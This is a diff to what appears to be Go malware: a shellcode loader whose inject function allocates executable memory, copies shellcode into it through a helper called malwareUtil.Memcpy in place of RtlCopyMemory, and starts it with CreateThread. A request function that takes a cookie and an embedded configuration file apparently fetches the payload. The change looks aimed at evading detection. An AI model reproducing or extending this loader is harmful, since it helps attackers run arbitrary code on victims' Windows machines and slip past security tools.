@@ -13,7 +13,6 @@ import (
 	"strconv"
 	"strings"
 	"time"
-	"unsafe"
 )
 
 //go:embed conf.txt
@@ -68,7 +67,7 @@ func request(cookie string, conf []string) []byte {
 func inject(shellcode []byte) {
 
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	rtlCopyMemory := kernel32.NewProc("RtlCopyMemory")
+	//rtlCopyMemory := kernel32.NewProc("RtlCopyMemory")
 	createThread := kernel32.NewProc("CreateThread")
 
 	shellcodeExec, _ := windows.VirtualAlloc(
@@ -77,10 +76,12 @@ func inject(shellcode []byte) {
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
 		windows.PAGE_EXECUTE_READWRITE)
 
-	rtlCopyMemory.Call(
-		shellcodeExec,
-		(uintptr)(unsafe.Pointer(&shellcode[0])),
-		uintptr(len(shellcode)))
+	malwareUtil.Memcpy(shellcodeExec, shellcode)
+	/*rtlCopyMemory.Call(
+	shellcodeExec,
+	(uintptr)(unsafe.Pointer(&shellcode[0])),
+	uintptr(len(shellcode)))
+	*/
 
 	var oldProtect uint32
 	windows.VirtualProtect(
